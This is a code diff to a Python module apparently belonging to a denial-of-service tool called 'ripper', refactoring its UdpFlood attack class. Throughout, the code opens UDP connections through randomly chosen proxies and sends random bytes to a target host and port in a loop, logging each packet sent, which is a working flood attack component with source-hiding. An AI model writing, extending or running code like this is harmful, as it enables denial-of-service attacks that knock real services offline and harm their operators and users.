@@ -7,11 +7,12 @@ from ripper.context.events_journal import EventsJournal
 from ripper.context.target import Target
 from ripper.constants import *
 from ripper.actions.attack_method import AttackMethod
+from ripper.proxy import Proxy
 
 # Forward Reference
 Context = 'Context'
 
-Events = EventsJournal()
+events_journal = EventsJournal()
 
 
 # TODO add support for SOCKS5 proxy if proxy supports associate request
@@ -28,11 +29,11 @@ class UdpFlood(AttackMethod):
     _sock: socket
     _target: Target
     _ctx: Context
-    _proxy: Any = None
+    _proxy: Proxy = None
 
-    def __init__(self, target: Target, context: Context):
+    def __init__(self, target: Target, _ctx: Context):
         self._target = target
-        self._ctx = context
+        self._ctx = _ctx
 
     def create_connection(self) -> socket:
         self._proxy = self._ctx.proxy_manager.get_random_proxy()
@@ -42,14 +43,15 @@ class UdpFlood(AttackMethod):
 
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as udp_conn:
-            self._ctx.target.statistic.connect.status_success()
-            Events.info('Creating new UDP connection...')
+            self._target.stats.connect.status_success()
+            events_journal.info('Creating new UDP connection...', target=self._target)
             while self.sendto(udp_conn):
                 if self._ctx.dry_run:
                     break
                 continue
 
-            self._ctx.target.statistic.connect.status_failed()
+            self._target.stats.connect.status_failed()
+            # self._ctx.sock_manager.close_socket()
 
     def sendto(self, sock: socket) -> bool:
         send_bytes = generate_random_bytes(
@@ -58,12 +60,12 @@ class UdpFlood(AttackMethod):
         try:
             sent = sock.sendto(send_bytes, self._target.hostip_port_tuple())
         except socket.gaierror as e:
-            Events.exception(e)
-            Events.error(GETTING_SERVER_IP_ERROR_MSG)
+            events_journal.exception(e, target=self._target)
+            events_journal.error(GETTING_SERVER_IP_ERR_MSG, target=self._target)
         except Exception as e:
-            Events.exception(e)
+            events_journal.exception(e, target=self._target)
         else:
-            self._ctx.target.statistic.packets.status_sent(sent_bytes=sent)
+            self._target.stats.packets.status_sent(sent_bytes=sent)
             return True
 
         return False
